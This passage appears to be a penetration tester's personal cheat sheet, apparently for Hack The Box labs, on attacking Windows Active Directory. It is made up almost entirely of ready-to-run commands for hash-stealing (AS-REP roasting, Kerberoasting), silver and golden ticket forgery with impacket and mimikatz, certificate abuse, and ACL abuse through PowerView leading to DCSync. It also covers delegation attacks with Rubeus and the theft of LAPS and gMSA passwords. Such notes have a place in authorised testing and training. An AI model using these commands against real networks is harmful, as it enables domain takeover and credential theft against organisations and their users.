 to adjust time 
Rdate –n <ip_target>
value of the flag “-dc-host” is usually “dc/dc01”

I will be using kerbrute to enumerate users

Stealing krb5 hash of the user

python impacket/GetNPUsers.py -dc-ip <victim_ip> -no-pass -request <domain>/@<victim_ip>
 
As a result I should get a krb5 hash of the user, that can be cracked to obtain a plain text password 

Extracting SPN (requires user’s credentials)

python impacket/GetUserSPNs.py <domain>/<username>:<password> -k
                    
                                        or

python impacket/GetUserSPNs.py <domain>/<username>:<password> -dc-host <value_of_subject_alternative_name_from_ldap> -k




Stealing krb5 hash of the service account associated with the user (requires credentials of the user)


python impacket/GetUserSPNs.py <domain>/<username>:<password> -k  -request
   
                                         or
python impacket/GetUserSPNs.py <domain>/<username>:<password> -dc-host <value_of_subject_alternative_name_from_ldap> -k -request



                                       or 
python impacket/getTGT.py <domain>/<username>:<password>

#I should get .ccache file

export KRB5CCNAME=.ccache

klist   #to check if everything was correctly exported


python impacket/GetUserSPNs.py  -dc-host <SPN>  <domain>/<username>:<password>@<ip> -k -no-pass -request




Extract domain SID (requires credentials)

python impacket/getPac.py -targetUser administrator <domain>/<username>:<password>



Silver ticket (requires NTLM hash for svc account and SPN and SID) 

#if I have a plain text password for the SVC account I can generate NTLM hash by online NTLM generator

to get domain SID   I need to execute on the target

             Get-ADDomain <domain>

                       or 

          I can launch impacket/getPac.py


to get SPN 
python impacket/GetUserSPNs.py <domain>/<username>:<password> -k
   
                                              or

python impacket/GetUserSPNs.py <domain>/<username>:<password> -dc-host <value_of_subject_alternative_name_from_ldap> -k


to generate ticket 


Python3 impacket/getST.py -spn <SPN> -impersonate Administrator –hashes <NTLM_svc_hash> domain/<svc_account>

                                         or

python impacket/ticketer.py -spn <SPN> -user-id 500 Administrator -nthash <NTLM_Hash> -domain-sid <SID>  -domain <domain>


                                          or
mimikatz “kerberos::golden /admin:administrator /id:1106 /domain:<htb.local> /sid:<SID> /target:<box.htb.local> /rc4:<NTLM_hash> /service:cifs /ptt” exit

 then you will get .ccache file 

Export KRB5CCNAME=administrator.ccache

to utilize the ticket

Python3 psexec.py <domain>/administrator@<victim_ip_or_hostname> -k –no-pass

                     or

python mssqlclient.py <subject_alternative_name_from_ldap> -k




Golden ticket (requires NTLM hash for krbtg account and domain SID)
#if I have a plain text password for the krbtg account I can generate NTLM hash by online NTLM generator

Rdate –n <ip_victim>
Nano /etc/hosts (to add the target’s domain)
Nano /etc/resolv.conf  (comment the current nameserver ) and add:
Nameserver <ip_victim>

I need the domain’s SID and to get it I execute on the target

Get-ADDomain <domain>

 or I can launch impacket/getPac.py

to generate ticket:

Python3 impacket/ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> administrator
or

.\mimikatz "kerberos::golden /User:Administrator /domain:<domain> /id:512 /sid:<SID> /krbtgt:<NTLM_hash> /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit

#you will get administrator.ccache file

Export KRB5CCNAME=administrator.ccache

to utilize the ticket and get access to the target

Python3 psexec.py <domain>/administrator@<victim_ip_or_hostname> -k –no-pass

                         or

python mssqlclient.py <subject_alternative_name_from_ldap> -k


After getting access to the system I will be dropping Sharphound to collect information and then analyze them in the BloodHound (in the .exe and .ps1 form)

I can gather all of the required AD information from python-Bloodhound (requires credentials)

Python3 bloodhound.py -ns <victim_ip>  -d <domain> -u <username> -p <password> -c all


Query registries remotely via impacket reg.py (requires credentials or NTLM)
Python3 impacket/reg.py <domain>/<user>@<victim_ip> query –keyName HKU\\


Knock and Pass (requires users’ credentials, and MS14-068- see Appendix for the code)

Forge the certificate (requires port 5986 must be open)

via   MS Active Directory Certificate Services in browser

#try to go to the

http://<victim_ip>/certsrv
 
#if you can access the above, you can proceed to generate certificate

Openssl genrsa –aes256 –out simon.key 2048

Openssl req –new –key simon.key -out simon.csr


#Now I need to go to the MS AD Certificate Services and sign simon.csr
#choose ‘advance certificate request’ option and paste a content of simon.csr
#download the result in base64-encoded format 
#and use evil winrm to get an access
./evil-winrm.rb -S -i <victim_ip> -k simon.key -out <signed_cert> -P 5986



via pfx file

After obtaining <file>.pfx
locate pfx2john
pfx2john <file>.pfx > hash_pfx
john hash_pfx –wordlist=<wordlist>

openssl pkcs12 -in <file>.pfx -info
#you should get certificate

openssl pkcs12 -in <file>.pfx -nocerts -out key.pem -nodes
#you will get key.pem file with a private key

openssl pkcs12 -in <file>.pfx -nokeys -out key.cert
#you wil lget a file with certificate

Now you have all the things needed to get a connection via evil winrm



Linux as a domain controller (requires SSH credentials)

Apt  install krb5-user

Rdate –n <victim_ip>

Nano /etc/krb5.conf
[libdefaults]
      default_realm = <domain_capital_letters>

[realms]
    <domain_capital_letters> = {
        kdc=<domain>:88
}

Kinit <username>
#you will be asked for the password
#If everything went OK ,there will be no response but keep going

klist #to check if everything went ok

Ssh <username>@<victim_ip>


Inside of the BloodHound

Analayze relationships between
User -> user
User -> groups
 this can be done manually or by checking  “Node Info” of your compromised user

When a compromised user has “AddKeycredentialLink” permission

                towards a user

Transport “Invoke-Whisker.ps1” (from PowerSharpPack) to the target

Invoke-Whisker -command “add /target:<target_user>”

You will get “Rubeus.exe asktgt …” as a result, copy everything and transport rubeus.exe (from SharpCollection) to the target

.\Rubeus.exe asktgt … 

and you should get NTLM hash of the target user

When  a compromised user has “WriteOwner” permission 

                             towards a user
Transport “PowerView.ps1” to the target
Set-DomainObjectOwner –Identity <target_user> -OwnerIdentiy <already_compromised_user>

Add-DomainObjectAcl –TargetIdentity <target_user> 
-PrincipalIdentity <already_compromised_user> -Rights ResetPassword

#if you get an error “Access Denied” just repeat Set-DomainObjectOwner command a few times



Re-launch you SharpHound and now in the BloodHound you should see that you own the user as well as that you have “ForceChangePassword” permission to this user


                             towards a group
Transport “PowerView.ps1” to the target
Set-DomainObjectOwner –Identity <target_group> -OwnerIdentiy <already_compromised_user> -Cred $creds

Add-DomainObjectAcl -TargetIdentity “<target_group>” -PrincipalIdentity “<already_compromised-user>” -Credential $creds

Add-DomainGroupMember -Identity “<target_group>” -Members “<already_compromised_user>” -Credential $creds

#As the result of the above you should add the compromised user to the target group

When a compromised user has “WriteSPN” permission 
towards another user

Set-DomainObject -Credential $Cred -Identity <target_user> -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

Get-DomainSPNTicket -Credential $Cred harmj0y | fl


When a compromised user has “Invoke-DCOM” permissions
$com=[activator]::CreateInstance([type]::GetTypeFromProgID[activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,<next_victim_ip>))

$com.Document.ActiveView.ExecuteShellCommand(“<cmd>”,null,null,null)

When a compromised user has “AddMembers” privileges
you can add another user or yourself to the target group


net group “<Target_group>” “<target_user_or_yourself>” /add /domain

or

Transport PowerView.ps1

Add-DomainGroupMember -Identity “<target_group>” -Members “<target_user_or_yourrself>” -Credential $creds

#as the result the target user should be added to the target group


When a compromised user has “AddSelf” privileges 
you can add yourself to the target group

net group “<Target_group>” “<target_user_or_yourself>” /add /domain

or

Transport PowerView.ps1

Add-DomainGroupMember -Identity “<target_group>” -Members “<target_user_or_yourrself>” -Credential $creds

When a compromised user has “ReadLAPSPassword” 
towards another user

Get-DomainObject -Credential $Cred -Identity <target> -Properties "ms-mcs-AdmPwd",name


When a compromised user has “ForceChangePassword” permission  


net user <target_user> <new_password> /domain
or

Transport PowerView.ps1 to target 

$pass=ConvertTo-SecureString “pass123!” -AsPlainText -Force
Set-DomainUserPassword <target_user> -AccountPassword $pass

And now I set up credentials for a user

                                                 Or

Rpcclient –U ‘<already_compromised_users>%<password_already_compromoised>’ <victim_ip>

Setuserinfo2 <target_user> 23 “pass123”   
#23 is an important number

   After setting up the password for a user by either way I can also add the target user to the group of my choosin (with some limits); interesting groups:
SSH
WinRM
LAPS
ExchangeWindows Permission                                      

 
-When a compromised user has “ReadLAPSPassword” permission

Get-DomainObject <hostname> -Credential $creds -Properties “ms-mcs-AdmPwd”,name

-when a compromised user has “WriteDacl” permission,

towards the user
 
Python3 secretsdump.py <compromised_user>@<ip>
Password: <compromised_password>

                                            Or
Transport PowerView.ps1 to target

Add-DomainObjectAcl –Credential $creds  -TargetIdentity “<DC=htb,DC=local_or_target_user>” -PrincipalIdentity <compromised_user> -Rights DCSync

#to get DC=.. I will execute on the target Get-AdUser <anything>

#there will be no response but keep going

Python3 secretsdump.py <domain>/<compromised_user>@<victim_ip>

#and now you should get hashes


      towards the group

Transport PowerView.ps1 to target

$pass=ConvertTo-SecureString  “<compromised_password>” -AsPlainText -Force
$creds=New-Object System.Management.Automation.PSCredential(“HTB\<compromised_username>”,$pass)

Add-DomainGroupMember –Identity “<target_group>” 
-Members <compromised_user>  -Credential $creds

#and now I added the compromised user to the target group

towards computer

Add-DomainObjectAcl -TargetIdentity <target_computer> -Rights All
#now you can read LAPS password



towards domain

Add-DomainObjectAcl -TargetIdentity <target_domain> -Rights DCSync
#now you can perform DCSYNC attack

-If a compromised user has “GetChanges & GetChangesAll” permissions (but both and the same time – only then it’s  dangerous) then I can perform DC_SYNC attack:

Python3 secretsdump.py <compromised_user>@<ip>
Password: <compromised_password>

#and I should get hashes


-When my compromised user has a ‘GenericWrite’ permissions 

                       Towards another user

Get-ADUser <target_user> | Set-AdAccountControl  -DoesNotRequirePreAuth $true

#then

Python3 GetNPUsers.py -dc-ip <target_ip> -request <target_domain>/<target_user> -no-pass

#and I should get a password hash of the target user


                                      Or if those permissions are towards the group


Transport PowerView.ps1 to target

$pass=ConvertTo-SecureString  “<compromised_password>” -AsPlainText -Force
$creds=New-Object System.Management.Automation.PSCredential(“HTB\<compromised_user>”,$pass)
Add-DomainGroupMember –Identity “<target_group>” 
-Members <compromised_user>  -Credential $creds

#and now I added myself to the target group



If Ia compromised user has “GenericAll” permission 

towards another user 

 I can reset a password for this user

Net user <target_user> <new_password>

make the user kerberostable
$SecPassword = ConvertTo-SecureString '<compromised_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\<compromised_username>', $SecPassword)

Set-DomainObject -Credential $Cred -Identity <target_user> -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

Get-DomainSPNTicket -Credential $Cred harmj0y | fl

disable preauthentication for the user and steal his hash 

Set-DomainObject -Identity <target_username> -XOR @{UserAccountControl=4194304}

python/impacket GetNPUser.py

                      Or if those permissions are towards the group

#I can add the compromised user to this group

net group <target_group> <compromised_user>  /domain /add

                        towards DC

transport PowerMad.ps1, PowerView.ps1 and Rubeus.exe on the target

New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Rubeus.exe hash /password:Summer2018!

Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

# you will get b64 ticket, transport to your machine 

nano ticket.kirbi.b64
base64 -d ticket.kirbi.b64 > ticket.kirbi

impacket/python3 ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass <domain>/adminstrator@dc.<domain>


If a compromised user has WriteDACL & WriteOwner permission at the same time

#I can give my compromised user GenericAll privileges

$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("<compromised_user>")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()


If the compromised user has WriteProperty permission

towards a group

#I can add the compromised user to this group

Add-NetGroupUser -UserName <compromised_user> -GroupName "<target_group>" -Domain "htb.local"

or
net group "<target_group>" <compromised_user> /add /domain

If the compromised user has Self permission

towards a group

I#I can add the compromised user to this group

Add-NetGroupUser -UserName <compromised_user> -GroupName "<target_group>" -Domain "htb.local"

If any query for  kerborostable users return data then I can take advantage of the already compromised user and  generate a password hash for the kerboertable  users, crack it and have credentials for those users

Transport PowerView.ps1

$pass=ConvertTo-SecureString “<password_of_already_compromised_user>” -AsPlainText –Force
$creds=New-Object System.Management.Automation.PSCredential(“.\<already_compromised_user>”,$pass)

Invoke-UserImpersonation –Credential $creds
Invoke-Kerberoast | fl

And I should get password hash of the kerberoastable users


                                                         Or

Python3 impacket GetUserSPNs.py -dc-ip <victim_ip> -request <domain>/<already_compromised_user>:<password>


And I should get password hash of the kerberostable users

When a compromised user has “SyncLAPSPassword”  permission

Sync-LAPS -LDAPFilter '(samaccountname=TargetComputer$)'

If a compromised user has DCSync permission

python secretsdump.py <domain>/<username>:<password>@<victim_ip>

If a compromised user has ReadGMSPassword permission then

$gmsa=get-adserviceaccount <target_account> -properties msDS-ManagedPassword
$mp=$gmsa.’msDS-ManagedPassword’
$secpassword=(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

$creds=New-Object System.Management.Automation.PSCredential(‘.\<target_user>’,$secpassword)
Invoke-Command -ComputerName <hostname> -Credential $creds -ScriptBlock { <cmd> }


                                                     or


Python gMSADumper.py -u <username> -p <password>  -d <domain>

And I should get a  hash of the target user

